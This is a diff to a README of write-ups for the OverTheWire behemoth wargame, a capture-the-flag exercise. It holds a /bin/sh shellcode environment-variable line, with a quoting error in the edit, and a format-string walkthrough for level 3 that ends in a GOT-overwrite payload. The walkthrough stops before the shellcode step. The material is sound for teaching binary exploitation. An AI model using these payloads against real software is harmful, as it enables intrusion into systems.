@@ -283,7 +283,7 @@ Okay, the length of the payload should be 71 + 4 bytes for the address we want t
 Using shell-storm, we get a basic shell in a size of 25 bytes: http://shell-storm.org/shellcode/files/shellcode-585.php
 Now we set our environ;
 ```
-behemoth1@behemoth:/tmp/intersys$ export EGG=$(python -c "print('\x90'*1000+'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')")
+behemoth1@behemoth:/tmp/intersys$ export EGG=$(python -c "print('\x90'*1000+'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+\x90'*1000)")
 behemoth1@behemoth:/tmp/intersys$ $EGG
 -bash: �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
              [1�1�1Ұ
@@ -431,8 +431,67 @@ Dump of assembler code for function main:
    0x080484da <+95>:	ret    
 End of assembler dump.
 ```
-![Screenshot](behemoth3.png)
+Okay, we can see that we have many printing functions and one that receives input (fgets). Let's see if we can abuse fgets, we open radare2 and analyse the main function with the following commands:
+```
+radare2 behemoth3
+s main
+aa
+VV
+```
+Then we should have the following graph:
+![Image](behemoth3.png)
 
+
+we see that the arguments that are pushed into fgets are '0' which is stdin file descriptor, a value of '200' which is the buffer size and a pointer to the string. So nothing here, let's see if we can abuse printf function - and yes, we can see with radare the the format doesn't contain and format string (%x/%p/%d etc'), it means that we can pop values from the stack, because the program doesn't know where to get them, as they are not mentioned. **now, I advise you to read about format string vulnerability in order to complete this challange. It to me a couple of days, but I think it's totally worth it.** a few resources:
+_http://phrack.org/issues/59/7.html_
+_http://phrack.org/issues/67/9.html_
+_https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf_
+
+
+Now, it's going to be a tedious work as I'm doing that manually. First, I want to find an address that is going to be executed, so I can overwrite it. Then, I'm going to set a shellcode inside an environ, as we did on earlier levels. 
+
+1. Finding an address: We can use the got which is the global offset table, where all the function are listed which are loaded into our program. Let's see if we can write into this addresses:
+```
+behemoth3@behemoth:/behemoth$ objdump -h behemoth3 | grep -A1 ' .\got'
+ 22 .got          00000004  08049794  08049794  00000794  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 23 .got.plt      0000001c  08049798  08049798  00000798  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+```
+Great, we don't see READONLY in .got, hence its writable. Now let's check our got addresses:
+
+```
+behemoth3@behemoth:/behemoth$ objdump -R behemoth3
+
+behemoth3:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049794 R_386_GLOB_DAT    __gmon_start__
+080497c0 R_386_COPY        stdin@@GLIBC_2.0
+080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0
+080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
+080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0
+080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+```
+We can use puts address as it's executed after printf. We can also use the function destrctors:
+```
+behemoth3@behemoth:/behemoth$ nm behemoth3 | grep 'DTOR'
+```
+Unfortunately we don't have anything, but sometimes it can be useful.
+Okay, to the dirty job -> we are going to write byte after byte into our address, which is 0x080497ac. You can see that I have adjusted it many times. I put the log in the root directory, as it contains many addresses. Link:
+[Link](https://github.com/int3rsys/behemoth-solutions/blob/master/behemoth3.log)
+**I highly advise you to read the links above in order to successfully write the data in your machine**
+
+So the the input was:
+```
+python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%260x%n')"
+```
+
+Now let's plant our shellcode:
+```
+
+```
 
 You can use the [editor on GitHub](https://github.com/int3rsys/behemoth-solutions/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
 
